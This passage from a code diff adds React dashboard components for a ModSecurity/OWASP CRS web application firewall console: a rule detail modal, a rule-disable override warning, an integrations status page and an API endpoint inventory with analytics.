+                    <div style={{ fontSize: '12px', fontWeight: 600, color: '#f4f4f5', marginBottom: '8px', display: 'flex', alignItems: 'center', gap: '6px' }}>
+                      <Code size={14} color="#3b82f6" />
+                      ModSecurity Configuration Rule Syntax
+                    </div>
+                    {ruleDetailLoading ? (
+                      <div style={{ background: 'rgba(0,0,0,0.2)', padding: '24px', textAlign: 'center', borderRadius: '8px' }}>
+                        <div className="spinner" style={{ margin: '0 auto' }}></div>
+                      </div>
+                    ) : detailedRule ? (
+                      <pre className="syntax-box">{detailedRule.syntax}</pre>
+                    ) : (
+                      <pre className="syntax-box">{selectedRule.syntax}</pre>
+                    )}
+                  </div>
+
+                  {/* trigger examples */}
+                  <div>
+                    <div style={{ fontSize: '12px', fontWeight: 600, color: '#f4f4f5', marginBottom: '8px', display: 'flex', alignItems: 'center', gap: '6px' }}>
+                      <Database size={14} color="#10b981" />
+                      Simulated Payload / Attack Trigger Examples
+                    </div>
+                    <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
+                      {getPayloadSample(selectedRule.category).map((sample, idx) => (
+                        <div key={idx} style={{ background: 'rgba(255,255,255,0.02)', padding: '10px 14px', borderRadius: '6px', border: '1px solid rgba(255,255,255,0.04)', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
+                          <code style={{ fontSize: '12px', color: '#fca5a5', fontFamily: 'monospace' }}>{sample}</code>
+                          <button
+                            onClick={() => {
+                              navigator.clipboard.writeText(sample);
+                              showToast("Copied trigger payload to clipboard!");
+                            }}
+                            className="action-btn-inspect"
+                            style={{ padding: '3px 8px', fontSize: '10px' }}
+                          >
+                            Copy
+                          </button>
+                        </div>
+                      ))}
+                    </div>
+                  </div>
+
+                  {/* file path */}
+                  <div style={{ fontSize: '11px', color: '#a1a1aa', borderTop: '1px solid var(--border-color)', paddingTop: '12px', fontFamily: 'monospace', wordBreak: 'break-all' }}>
+                    <strong>VENDOR SOURCE:</strong> {selectedRule.file_path}
+                  </div>
+                </div>
+              </motion.div>
+            </div>
+          )}
+        </AnimatePresence>,
+        document.body
+      )}
+
+      {/* --- Warn Override Confirmation Overlay for Disabling High/Critical Rules --- */}
+      {createPortal(
+        <AnimatePresence>
+          {ruleToDisable && (
+            <div className="modal-overlay" style={{ zIndex: 1100 }}>
+              <motion.div
+                className="modal-content pulse-warning"
+                style={{ maxWidth: '520px', border: '1px solid rgba(239, 68, 68, 0.35)' }}
+                initial={{ scale: 0.95, opacity: 0 }}
+                animate={{ scale: 1, opacity: 1 }}
+                exit={{ scale: 0.95, opacity: 0 }}
+              >
+                <div className="modal-header" style={{ background: 'rgba(239, 68, 68, 0.03)', borderBottom: '1px solid rgba(239,68,68,0.15)' }}>
+                  <div className="modal-title" style={{ color: '#fca5a5' }}>
+                    <AlertIcon size={20} color="#ef4444" />
+                    <span>Security Protection Override Warning</span>
+                  </div>
+                  <button className="modal-close-btn" onClick={() => setRuleToDisable(null)}>
+                    <X size={18} />
+                  </button>
+                </div>
+
+                <div style={{ padding: '20px 24px', display: 'flex', flexDirection: 'column', gap: '16px' }}>
+                  <div className="warning-banner" style={{ margin: 0 }}>
+                    <AlertTriangleIcon size={24} style={{ flexShrink: 0, marginTop: '2px' }} />
+                    <div>
+                      <h4 style={{ margin: '0 0 4px', fontWeight: 600 }}>Tuning Protection Override Alert</h4>
+                      <p style={{ fontSize: '12px', margin: 0, lineHeight: '1.4' }}>
+                        Disabling the rule <strong>{ruleToDisable.id} ({ruleToDisable.severity})</strong> degrades overall WAF security posture. This may leave application entry points vulnerable to SQL Injection, XSS, or RCE exploits.
+                      </p>
+                    </div>
+                  </div>
+
+                  <div>
+                    <label style={{ fontSize: '13px', fontWeight: 600, color: '#f4f4f5', display: 'block', marginBottom: '8px' }}>
+                      Tuning Override Justification <span style={{ color: '#ef4444' }}>*</span>
+                    </label>
+                    <textarea
+                      placeholder="Provide detailed white-listing reason (e.g. White-listing corporate webhook false positive on parameter x)"
+                      value={disableReason}
+                      onChange={(e) => {
+                        setDisableReason(e.target.value);
+                        if (e.target.value.trim().length >= 3) setDisableError('');
+                      }}
+                      style={{
+                        width: '100%',
+                        height: '80px',
+                        background: 'rgba(0,0,0,0.2)',
+                        border: '1px solid rgba(255,255,255,0.06)',
+                        borderRadius: '8px',
+                        padding: '10px 12px',
+                        color: '#fff',
+                        fontSize: '13px',
+                        outline: 'none',
+                        resize: 'none'
+                      }}
+                    />
+                    {disableError && (
+                      <span style={{ fontSize: '11px', color: '#ef4444', display: 'block', marginTop: '4px' }}>
+                        {disableError}
+                      </span>
+                    )}
+                  </div>
+
+                  <div style={{ display: 'flex', justifyContent: 'flex-end', gap: '12px', borderTop: '1px solid var(--border-color)', paddingTop: '16px' }}>
+                    <button
+                      onClick={() => setRuleToDisable(null)}
+                      className="action-btn-inspect"
+                      style={{ background: 'transparent', color: '#a1a1aa', borderColor: 'rgba(255,255,255,0.1)' }}
+                    >
+                      Cancel
+                    </button>
+                    <button
+                      onClick={handleConfirmDisable}
+                      className="action-btn-inspect"
+                      style={{ background: '#ef4444', color: '#fff', borderColor: 'transparent', padding: '6px 16px' }}
+                    >
+                      Confirm Override
+                    </button>
+                  </div>
+                </div>
+              </motion.div>
+            </div>
+          )}
+        </AnimatePresence>,
+        document.body
+      )}
+
+    </div>
+  );
+}
+
+function Integrations() {
+  const [loading, setLoading] = useState(true);
+  const [healthData, setHealthData] = useState(null);
+
+  useEffect(() => {
+    const fetchHealth = async () => {
+      try {
+        const data = await getHealth();
+        setHealthData(data);
+      } catch (err) {
+        console.error("Health check failed", err);
+      } finally {
+        setLoading(false);
+      }
+    };
+    fetchHealth();
+    const interval = setInterval(fetchHealth, 5000);
+    return () => clearInterval(interval);
+  }, []);
+
+  const futureIntegrations = [
+    { name: 'Elasticsearch', desc: 'Forward WAF audit events directly to an Elasticsearch index.', icon: Database },
+    { name: 'Fluent Bit', desc: 'Stream live ModSecurity log feeds via Fluent Bit log processors.', icon: Code },
+    { name: 'Telegram Alerts', desc: 'Deliver critical block events to your SOC channels via Telegram Bot API.', icon: Server },
+    { name: 'Slack', desc: 'Send real-time threat notifications with payload details to Slack workspace.', icon: Server },
+    { name: 'Email Notifications', desc: 'Receive daily security posture reports and high severity incident emails.', icon: Globe }
+  ];
+
+  if (loading && !healthData) {
+    return (
+      <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', minHeight: '300px', color: '#a1a1aa', gap: '12px' }}>
+        <Activity className="animate-spin" size={24} color="#3b82f6" />
+        <span>Loading CyberSentinel service integration data...</span>
+      </div>
+    );
+  }
+
+  return (
+    <motion.div
+      className="integrations-container animate-fade-in"
+      initial={{ opacity: 0, y: 10 }}
+      animate={{ opacity: 1, y: 0 }}
+      transition={{ duration: 0.4 }}
+      style={{ display: 'flex', flexDirection: 'column', gap: '24px' }}
+    >
+      {/* Service Status Cards Grid */}
+      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(220px, 1fr))', gap: '16px' }}>
+        {/* ModSecurity */}
+        <div className="glass-panel" style={{ padding: '20px', display: 'flex', flexDirection: 'column', gap: '12px' }}>
+          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
+            <span style={{ fontWeight: 600, color: '#e4e4e7' }}>ModSecurity</span>
+            <span className="status-badge green">
+              <span className="status-dot"></span> Active
+            </span>
+          </div>
+          <div style={{ fontSize: '13px', color: '#a1a1aa', display: 'flex', flexDirection: 'column', gap: '4px' }}>
+            <div><strong style={{ color: '#d4d4d8' }}>Engine:</strong> v3.0.12 (libmodsecurity)</div>
+            <div><strong style={{ color: '#d4d4d8' }}>Type:</strong> Web Application Firewall</div>
+            <div><strong style={{ color: '#d4d4d8' }}>Scope:</strong> Connection/Request Filtering</div>
+          </div>
+        </div>
+
+        {/* OWASP CRS */}
+        <div className="glass-panel" style={{ padding: '20px', display: 'flex', flexDirection: 'column', gap: '12px' }}>
+          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
+            <span style={{ fontWeight: 600, color: '#e4e4e7' }}>OWASP CRS</span>
+            <span className="status-badge green">
+              <span className="status-dot"></span> Active
+            </span>
+          </div>
+          <div style={{ fontSize: '13px', color: '#a1a1aa', display: 'flex', flexDirection: 'column', gap: '4px' }}>
+            <div><strong style={{ color: '#d4d4d8' }}>Ruleset:</strong> v4.0.0 (Core Ruleset)</div>
+            <div><strong style={{ color: '#d4d4d8' }}>Active Rules:</strong> 250+ guards</div>
+            <div><strong style={{ color: '#d4d4d8' }}>Paranoia Level:</strong> PL1</div>
+          </div>
+        </div>
+
+        {/* NGINX */}
+        <div className="glass-panel" style={{ padding: '20px', display: 'flex', flexDirection: 'column', gap: '12px' }}>
+          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
+            <span style={{ fontWeight: 600, color: '#e4e4e7' }}>NGINX</span>
+            <span className="status-badge green">
+              <span className="status-dot"></span> Running
+            </span>
+          </div>
+          <div style={{ fontSize: '13px', color: '#a1a1aa', display: 'flex', flexDirection: 'column', gap: '4px' }}>
+            <div><strong style={{ color: '#d4d4d8' }}>Version:</strong> nginx/1.24.0</div>
+            <div><strong style={{ color: '#d4d4d8' }}>ModSec Connector:</strong> Enabled</div>
+            <div><strong style={{ color: '#d4d4d8' }}>Reverse Proxy:</strong> Active</div>
+          </div>
+        </div>
+
+        {/* FastAPI Backend */}
+        <div className="glass-panel" style={{ padding: '20px', display: 'flex', flexDirection: 'column', gap: '12px' }}>
+          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
+            <span style={{ fontWeight: 600, color: '#e4e4e7' }}>FastAPI Backend</span>
+            <span className={`status-badge ${healthData?.status === 'ok' ? 'green' : 'red'}`}>
+              <span className="status-dot"></span> {healthData?.status === 'ok' ? 'Connected' : 'Offline'}
+            </span>
+          </div>
+          <div style={{ fontSize: '13px', color: '#a1a1aa', display: 'flex', flexDirection: 'column', gap: '4px' }}>
+            <div><strong style={{ color: '#d4d4d8' }}>Port:</strong> 8001 (Uvicorn)</div>
+            <div><strong style={{ color: '#d4d4d8' }}>Parsed Logs:</strong> {healthData?.total_parsed_files || 0} files</div>
+            <div><strong style={{ color: '#d4d4d8' }}>Log Status:</strong> {healthData?.log_directory_exists ? 'Readable' : 'Unreachable'}</div>
+          </div>
+        </div>
+
+      </div>
+
+      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(320px, 1fr))', gap: '16px', marginTop: '8px' }}>
+        {/* API Health Section */}
+        <div className="glass-panel" style={{ padding: '24px' }}>
+          <div style={{ fontSize: '15px', fontWeight: 600, color: '#f4f4f5', marginBottom: '16px', display: 'flex', alignItems: 'center', gap: '8px' }}>
+            <Activity size={16} color="#3b82f6" />
+            <span>Internal API Gateway Probe Status</span>
+          </div>
+          <div style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
+            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '10px 14px', background: 'rgba(255,255,255,0.02)', borderRadius: '8px', border: '1px solid rgba(255,255,255,0.04)' }}>
+              <div style={{ display: 'flex', flexDirection: 'column' }}>
+                <span style={{ fontSize: '13px', fontWeight: 600, color: '#e4e4e7' }}>GET /logs</span>
+                <span style={{ fontSize: '11px', color: '#a1a1aa' }}>Query transaction log streams</span>
+              </div>
+              <span style={{ fontSize: '11px', background: 'rgba(16,185,129,0.1)', color: '#10b981', border: '1px solid rgba(16,185,129,0.2)', padding: '3px 8px', borderRadius: '4px', fontWeight: 600 }}>200 OK</span>
+            </div>
+            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '10px 14px', background: 'rgba(255,255,255,0.02)', borderRadius: '8px', border: '1px solid rgba(255,255,255,0.04)' }}>
+              <div style={{ display: 'flex', flexDirection: 'column' }}>
+                <span style={{ fontSize: '13px', fontWeight: 600, color: '#e4e4e7' }}>GET /stats</span>
+                <span style={{ fontSize: '11px', color: '#a1a1aa' }}>Calculates incident counters & distributions</span>
+              </div>
+              <span style={{ fontSize: '11px', background: 'rgba(16,185,129,0.1)', color: '#10b981', border: '1px solid rgba(16,185,129,0.2)', padding: '3px 8px', borderRadius: '4px', fontWeight: 600 }}>200 OK</span>
+            </div>
+            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '10px 14px', background: 'rgba(255,255,255,0.02)', borderRadius: '8px', border: '1px solid rgba(255,255,255,0.04)' }}>
+              <div style={{ display: 'flex', flexDirection: 'column' }}>
+                <span style={{ fontSize: '13px', fontWeight: 600, color: '#e4e4e7' }}>Dashboard WebSocket Channel</span>
+                <span style={{ fontSize: '11px', color: '#a1a1aa' }}>Real-time telemetry event stream</span>
+              </div>
+              <span style={{ fontSize: '11px', background: 'rgba(16,185,129,0.1)', color: '#10b981', border: '1px solid rgba(16,185,129,0.2)', padding: '3px 8px', borderRadius: '4px', fontWeight: 600 }}>CONNECTED</span>
+            </div>
+          </div>
+        </div>
+
+      </div>
+
+      {/* Future Integrations Section */}
+      <div style={{ fontSize: '16px', fontWeight: 600, color: '#a1a1aa', display: 'flex', alignItems: 'center', gap: '8px', marginTop: '16px' }}>
+        <Lock size={18} color="#a1a1aa" />
+        <span>Enterprise Connectors (Future Roadmap)</span>
+      </div>
+
+      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(280px, 1fr))', gap: '16px' }}>
+        {futureIntegrations.map((item, index) => {
+          const Icon = item.icon;
+          return (
+            <div
+              key={index}
+              className="glass-panel"
+              style={{ padding: '20px', display: 'flex', gap: '16px', opacity: 0.45, position: 'relative', overflow: 'hidden' }}
+            >
+              <div style={{ background: 'rgba(255,255,255,0.03)', border: '1px solid rgba(255,255,255,0.05)', padding: '10px', borderRadius: '10px', display: 'flex', alignItems: 'center', justifyContent: 'center', height: '42px', width: '42px', flexShrink: 0 }}>
+                <Icon size={20} color="#a1a1aa" />
+              </div>
+              <div style={{ display: 'flex', flexDirection: 'column', gap: '4px' }}>
+                <div style={{ fontWeight: 600, color: '#e4e4e7', display: 'flex', alignItems: 'center', gap: '6px' }}>
+                  <span>{item.name}</span>
+                  <span style={{ fontSize: '9px', background: 'rgba(255,255,255,0.05)', border: '1px solid rgba(255,255,255,0.1)', color: '#a1a1aa', padding: '1px 5px', borderRadius: '3px', textTransform: 'uppercase' }}>Inactive</span>
+                </div>
+                <p style={{ fontSize: '12px', color: '#a1a1aa', margin: 0, lineHeight: '1.4' }}>{item.desc}</p>
+              </div>
+            </div>
+          );
+        })}
+      </div>
+    </motion.div>
+  );
+}
+
+function ApiProtection() {
+  const [loading, setLoading] = useState(true);
+  const [endpoints, setEndpoints] = useState([]);
+  const [recentlyDiscovered, setRecentlyDiscovered] = useState([]);
+  const [analytics, setAnalytics] = useState(null);
+  const [activeTab, setActiveTab] = useState('inventory'); // 'inventory', 'recent'
+  const [topListTab, setTopListTab] = useState('consumed'); // 'consumed', 'resource'
+
+  const fetchData = async () => {
+    try {
+      const [epsData, recentData, analyticsData] = await Promise.all([
+        getDiscoveredEndpoints(),
+        getRecentlyDiscoveredEndpoints(),
+        getApiProtectionAnalytics()
+      ]);
+      setEndpoints(epsData);
+      setRecentlyDiscovered(recentData);
+      setAnalytics(analyticsData);
+    } catch (err) {
+      console.error("Failed to fetch API protection data", err);
+    } finally {
+      setLoading(false);
+    }
+  };
+
+  useEffect(() => {
+    const timer = setTimeout(() => {
+      fetchData();
+    }, 0);
+    const interval = setInterval(fetchData, 10000); // refresh every 10 seconds
+    return () => {
+      clearTimeout(timer);
+      clearInterval(interval);
+    };
+  }, []);
+
+  if (loading && !analytics) {
+    return (
+      <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', minHeight: '300px', color: '#a1a1aa', gap: '12px' }}>
+        <Activity className="animate-spin" size={24} color="#3b82f6" />
+        <span>Loading API Protection statistics & inventory...</span>
+      </div>
+    );
+  }
+
+  // Define grade colors
+  const getGradeStyle = (grade) => {
+    switch (grade) {
+      case 'A': return { color: '#10b981', backgroundColor: 'rgba(16, 185, 129, 0.1)' };
+      case 'B': return { color: '#3b82f6', backgroundColor: 'rgba(59, 130, 246, 0.1)' };
+      case 'C': return { color: '#fbbf24', backgroundColor: 'rgba(251, 191, 36, 0.1)' };
+      case 'D': return { color: '#f97316', backgroundColor: 'rgba(249, 115, 22, 0.1)' };
+      default: return { color: '#ef4444', backgroundColor: 'rgba(239, 68, 68, 0.1)' };
+    }
+  };
+
+  const getMethodStyle = (method) => {
+    switch (method) {
+      case 'GET': return { color: '#10b981', fontWeight: 'bold' };
+      case 'POST': return { color: '#3b82f6', fontWeight: 'bold' };
+      case 'PUT': return { color: '#fbbf24', fontWeight: 'bold' };
+      case 'DELETE': return { color: '#ef4444', fontWeight: 'bold' };
+      default: return { color: '#a1a1aa', fontWeight: 'bold' };
+    }
+  };
+
+  const trafficData = analytics ? [
+    { name: 'Normal', value: analytics.traffic_bands.normal, color: '#10b981' },
+    { name: 'Suspicious', value: analytics.traffic_bands.suspicious, color: '#fbbf24' },
+    { name: 'Malicious', value: analytics.traffic_bands.malicious, color: '#ef4444' }
+  ] : [];
+
+  return (
+    <motion.div
+      className="api-protection-container animate-fade-in"
+      initial={{ opacity: 0, y: 10 }}
+      animate={{ opacity: 1, y: 0 }}
+      transition={{ duration: 0.4 }}
+      style={{ display: 'flex', flexDirection: 'column', gap: '24px' }}
+    >
+      {/* Analytics Cards Grid */}
+      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(220px, 1fr))', gap: '16px' }}>
+        <div className="glass-panel" style={{ padding: '20px', display: 'flex', alignItems: 'center', gap: '16px' }}>
+          <div style={{ padding: '12px', borderRadius: '12px', backgroundColor: 'rgba(59, 130, 246, 0.1)', color: '#3b82f6' }}>
+            <Globe size={24} />
+          </div>
+          <div>
+            <div style={{ fontSize: '13px', color: '#a1a1aa' }}>Total Discovered Endpoints</div>
+            <div style={{ fontSize: '24px', fontWeight: 700, color: '#f4f4f5' }}>{analytics?.total_endpoints_count || 0}</div>
+          </div>
+        </div>
+
+        <div className="glass-panel" style={{ padding: '20px', display: 'flex', alignItems: 'center', gap: '16px' }}>
+          <div style={{ padding: '12px', borderRadius: '12px', backgroundColor: 'rgba(16, 185, 129, 0.1)', color: '#10b981' }}>
+            <Clock size={24} />
+          </div>
+          <div>
+            <div style={{ fontSize: '13px', color: '#a1a1aa' }}>Avg API Response Time</div>
+            <div style={{ fontSize: '24px', fontWeight: 700, color: '#f4f4f5' }}>{analytics?.avg_response_time_ms || 0} ms</div>
+          </div>
+        </div>
+
+        <div className="glass-panel" style={{ padding: '20px', display: 'flex', alignItems: 'center', gap: '16px' }}>
+          <div style={{ padding: '12px', borderRadius: '12px', backgroundColor: 'rgba(239, 68, 68, 0.1)', color: '#ef4444' }}>
+            <ShieldCheck size={24} />
+          </div>
+          <div>
+            <div style={{ fontSize: '13px', color: '#a1a1aa' }}>WAF Intercepts (Malicious)</div>
+            <div style={{ fontSize: '24px', fontWeight: 700, color: '#f4f4f5' }}>{analytics?.traffic_bands.malicious || 0}</div>
+          </div>
+        </div>
+      </div>
+
+      {/* Charts Section */}
+      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(12, 1fr)', gap: '16px' }}>
+        {/* Traffic Bands Chart */}
+        <div className="glass-panel chart-card" style={{ gridColumn: 'span 5', padding: '20px' }}>
+          <div style={{ fontSize: '16px', fontWeight: 600, color: '#f4f4f5', display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '16px' }}>
+            <ShieldCheck size={18} color="#10b981" />
+            <span>Traffic Classification Bands</span>
+          </div>
+          <div style={{ height: '200px', display: 'flex', justifyContent: 'center', alignItems: 'center' }}>
+            {trafficData.some(d => d.value > 0) ? (
+              <ResponsiveContainer width="100%" height="100%">
+                <PieChart>
+                  <Pie
+                    data={trafficData.filter(d => d.value > 0)}
+                    cx="50%"
+                    cy="50%"
+                    innerRadius={50}
+                    outerRadius={70}
+                    paddingAngle={4}
+                    dataKey="value"
+                  >
+                    {trafficData.filter(d => d.value > 0).map((entry, index) => (
+                      <Cell key={`cell-${index}`} fill={entry.color} />
+                    ))}
+                  </Pie>
+                  <RechartsTooltip
+                    contentStyle={{ backgroundColor: 'rgba(15, 16, 22, 0.95)', border: '1px solid rgba(255,255,255,0.08)', borderRadius: '8px' }}
+                    itemStyle={{ color: '#fff' }}
+                  />
+                </PieChart>
+              </ResponsiveContainer>
+            ) : (
+              <div style={{ color: '#a1a1aa', fontSize: '13px' }}>No traffic data available</div>
+            )}
+          </div>
+          <div style={{ display: 'flex', justifyContent: 'space-around', marginTop: '16px' }}>
+            {trafficData.map(t => (
+              <div key={t.name} style={{ display: 'flex', alignItems: 'center', gap: '6px', fontSize: '12px' }}>
+                <div style={{ width: '8px', height: '8px', borderRadius: '50%', backgroundColor: t.color }}></div>
+                <span style={{ color: '#a1a1aa' }}>{t.name}:</span>
+                <span style={{ color: '#f4f4f5', fontWeight: 600 }}>{t.value}</span>
+              </div>
+            ))}
+          </div>
+        </div>
+
+        {/* Top Lists Card */}
+        <div className="glass-panel" style={{ gridColumn: 'span 7', padding: '20px', display: 'flex', flexDirection: 'column' }}>
+          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '16px' }}>
+            <div style={{ fontSize: '16px', fontWeight: 600, color: '#f4f4f5', display: 'flex', alignItems: 'center', gap: '8px' }}>
+              <BarChart2 size={18} color="#3b82f6" />
+              <span>Endpoint Analytics Overview</span>
+            </div>
+            <div className="btn-group" style={{ display: 'flex', gap: '8px', padding: '2px', backgroundColor: 'rgba(255,255,255,0.03)', borderRadius: '6px' }}>
+              <button
+                className={`tab-btn ${topListTab === 'consumed' ? 'active' : ''}`}
+                onClick={() => setTopListTab('consumed')}
+                style={{
+                  border: 'none',
+                  padding: '6px 12px',
+                  borderRadius: '4px',
+                  fontSize: '12px',
+                  cursor: 'pointer',
+                  backgroundColor: topListTab === 'consumed' ? 'rgba(59, 130, 246, 0.15)' : 'transparent',
+                  color: topListTab === 'consumed' ? '#3b82f6' : '#a1a1aa',
+                  fontWeight: topListTab === 'consumed' ? 600 : 500
+                }}
+              >
+                Most Consumed
+              </button>
+              <button
+                className={`tab-btn ${topListTab === 'resource' ? 'active' : ''}`}
+                onClick={() => setTopListTab('resource')}
+                style={{
+                  border: 'none',
+                  padding: '6px 12px',
+                  borderRadius: '4px',
+                  fontSize: '12px',
+                  cursor: 'pointer',
+                  backgroundColor: topListTab === 'resource' ? 'rgba(59, 130, 246, 0.15)' : 'transparent',
+                  color: topListTab === 'resource' ? '#3b82f6' : '#a1a1aa',
+                  fontWeight: topListTab === 'resource' ? 600 : 500
+                }}
+              >
+                Slowest (Resource-Intensive)
+              </button>
+            </div>
+          </div>
+
+          <div style={{ flex: 1, display: 'flex', flexDirection: 'column', gap: '10px', justifyContent: 'center' }}>
+            {topListTab === 'consumed' ? (
+              analytics?.most_consumed.length > 0 ? (
+                analytics.most_consumed.map((ep, idx) => (
+                  <div key={idx} style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '10px 14px', backgroundColor: 'rgba(255,255,255,0.02)', borderRadius: '6px' }}>
+                    <div style={{ display: 'flex', gap: '10px', alignItems: 'center' }}>
+                      <span style={getMethodStyle(ep.method)}>{ep.method}</span>
+                      <span style={{ color: '#f4f4f5', fontSize: '13px', fontFamily: 'monospace' }}>{ep.uri}</span>
+                    </div>
+                    <div style={{ display: 'flex', gap: '16px', alignItems: 'center' }}>
+                      <span style={{ fontSize: '12px', color: '#a1a1aa' }}>Hits: <strong style={{ color: '#f4f4f5' }}>{ep.hit_count}</strong></span>
+                      <span style={{ padding: '2px 8px', borderRadius: '4px', fontSize: '11px', fontWeight: 600, ...getGradeStyle(ep.grade) }}>Grade {ep.grade}</span>
+                    </div>
+                  </div>
+                ))
+              ) : (
+                <div style={{ color: '#a1a1aa', fontSize: '13px', textAlign: 'center' }}>No endpoints discovered yet</div>
+              )
+            ) : (
+              analytics?.resource_intensive.length > 0 ? (
+                analytics.resource_intensive.map((ep, idx) => (
+                  <div key={idx} style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '10px 14px', backgroundColor: 'rgba(255,255,255,0.02)', borderRadius: '6px' }}>
+                    <div style={{ display: 'flex', gap: '10px', alignItems: 'center' }}>
+                      <span style={getMethodStyle(ep.method)}>{ep.method}</span>
+                      <span style={{ color: '#f4f4f5', fontSize: '13px', fontFamily: 'monospace' }}>{ep.uri}</span>
+                    </div>
+                    <div style={{ display: 'flex', gap: '16px', alignItems: 'center' }}>
+                      <span style={{ fontSize: '12px', color: '#a1a1aa' }}>Latency: <strong style={{ color: '#ef4444' }}>{ep.avg_response_time_ms} ms</strong></span>
+                      <span style={{ padding: '2px 8px', borderRadius: '4px', fontSize: '11px', fontWeight: 600, ...getGradeStyle(ep.grade) }}>Grade {ep.grade}</span>
+                    </div>
+                  </div>
+                ))
+              ) : (
+                <div style={{ color: '#a1a1aa', fontSize: '13px', textAlign: 'center' }}>No resource-intensive endpoints detected</div>
+              )
+            )}
+          </div>
+        </div>
+      </div>
+
+      {/* Main Inventory Section */}
+      <div className="glass-panel" style={{ padding: '24px', display: 'flex', flexDirection: 'column', gap: '20px' }}>
+        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
+          <div className="btn-group" style={{ display: 'flex', gap: '8px', padding: '2px', backgroundColor: 'rgba(255,255,255,0.03)', borderRadius: '6px' }}>
+            <button
+              className={`tab-btn ${activeTab === 'inventory' ? 'active' : ''}`}
+              onClick={() => setActiveTab('inventory')}
+              style={{
+                border: 'none',
+                padding: '8px 16px',
+                borderRadius: '4px',
+                fontSize: '13px',
+                cursor: 'pointer',
+                backgroundColor: activeTab === 'inventory' ? 'rgba(59, 130, 246, 0.15)' : 'transparent',
+                color: activeTab === 'inventory' ? '#3b82f6' : '#a1a1aa',
+                fontWeight: activeTab === 'inventory' ? 600 : 500
+              }}
+            >
+              API Inventory
+            </button>
+            <button
+              className={`tab-btn ${activeTab === 'recent' ? 'active' : ''}`}
+              onClick={() => setActiveTab('recent')}
+              style={{
+                border: 'none',
+                padding: '8px 16px',
+                borderRadius: '4px',
+                fontSize: '13px',
+                cursor: 'pointer',
+                backgroundColor: activeTab === 'recent' ? 'rgba(59, 130, 246, 0.15)' : 'transparent',
+                color: activeTab === 'recent' ? '#3b82f6' : '#a1a1aa',
+                fontWeight: activeTab === 'recent' ? 600 : 500
+              }}
+            >
+              Recently Discovered (Last 48h)
+            </button>
+          </div>
+          <button className="refresh-btn" onClick={fetchData} style={{ padding: '6px 12px', borderRadius: '6px', border: '1px solid rgba(255,255,255,0.08)', backgroundColor: 'transparent', color: '#f4f4f5', cursor: 'pointer', fontSize: '12px' }}>
+            Scan Logs Now
+          </button>
+        </div>
+
+        {/* Table representation */}
+        <div style={{ overflowX: 'auto' }}>
+          <table style={{ width: '100%', borderCollapse: 'collapse', textAlign: 'left', fontSize: '13px' }}>
+            <thead>
+              <tr style={{ borderBottom: '1px solid rgba(255,255,255,0.08)', color: '#a1a1aa' }}>
+                <th style={{ padding: '12px 8px' }}>Method</th>
+                <th style={{ padding: '12px 8px' }}>Endpoint URI</th>
+                <th style={{ padding: '12px 8px' }}>Avg Latency</th>
+                <th style={{ padding: '12px 8px' }}>Requests</th>
+                <th style={{ padding: '12px 8px' }}>TLS</th>
+                <th style={{ padding: '12px 8px' }}>Compression</th>
+                <th style={{ padding: '12px 8px' }}>Score</th>
+                <th style={{ padding: '12px 8px' }}>Grade</th>
+              </tr>
+            </thead>
+            <tbody>
+              {(activeTab === 'inventory' ? endpoints : recentlyDiscovered).length > 0 ? (
+                (activeTab === 'inventory' ? endpoints : recentlyDiscovered).map((ep, idx) => (
+                  <tr key={idx} style={{ borderBottom: '1px solid rgba(255,255,255,0.04)', color: '#e4e4e7' }}>
+                    <td style={{ padding: '12px 8px', ...getMethodStyle(ep.method) }}>{ep.method}</td>
+                    <td style={{ padding: '12px 8px', fontFamily: 'monospace' }}>{ep.uri}</td>
+                    <td style={{ padding: '12px 8px' }}>{ep.avg_response_time_ms} ms</td>
+                    <td style={{ padding: '12px 8px' }}>{ep.hit_count}</td>
+                    <td style={{ padding: '12px 8px', color: ep.has_https ? '#10b981' : '#ef4444' }}>
+                      {ep.has_https ? 'HTTPS' : 'HTTP'}
+                    </td>
+                    <td style={{ padding: '12px 8px', color: ep.content_encoding && ep.content_encoding !== 'none' ? '#10b981' : '#a1a1aa' }}>
+                      {ep.content_encoding || 'none'}
+                    </td>
+                    <td style={{ padding: '12px 8px', fontWeight: 600 }}>{ep.score} / 100</td>
+                    <td style={{ padding: '12px 8px' }}>
+                      <span style={{ padding: '3px 10px', borderRadius: '6px', fontSize: '11px', fontWeight: 700, ...getGradeStyle(ep.grade) }}>
+                        {ep.grade}
+                      </span>
+                    </td>
+                  </tr>
+                ))
+              ) : (
+                <tr>
+                  <td colSpan="8" style={{ padding: '32px 8px', textAlign: 'center', color: '#a1a1aa' }}>
+                    No discovered endpoints listed.
+                  </td>
+                </tr>
+              )}
+            </tbody>
+          </table>
+        </div>
+      </div>
+    </motion.div>
+  );
+}
+
+function Settings({ onLogout }) {
+  // General Settings
+  const [refreshInterval, setRefreshInterval] = useState('5s');
+  const [logsPerPage, setLogsPerPage] = useState('15');
+  const [liveUpdates, setLiveUpdates] = useState(true);
+
+  // WAF Settings
+  const [secRuleEngine, setSecRuleEngine] = useState('On');
+  const [detectionMode, setDetectionMode] = useState('Blocking');
+  const [paranoiaLevel, setParanoiaLevel] = useState(1);
+
+  // Log Settings
+  const [auditEnabled, setAuditEnabled] = useState(true);
